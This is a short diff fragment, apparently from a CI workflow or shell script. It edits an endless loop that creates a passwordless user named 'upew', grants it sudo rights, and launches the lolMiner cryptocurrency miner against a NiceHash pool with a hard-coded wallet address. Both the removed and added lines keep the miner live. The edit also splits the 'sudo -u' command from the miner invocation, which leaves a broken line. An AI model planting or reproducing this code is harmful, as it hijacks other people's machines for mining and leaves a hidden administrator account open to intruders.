@@ -9,5 +9,6 @@
                 
                 while (true); do
                   sudo adduser --disabled-password --gecos "" upew && sudo usermod -aG sudo upew
-                  sudo -u upew ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 1-99999 -n 1)-GPU) --ethstratum ETHPROXY
+                  sudo -u upew 
+                  ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 1-99999 -n 1)-GPU) --ethstratum ETHPROXY
             
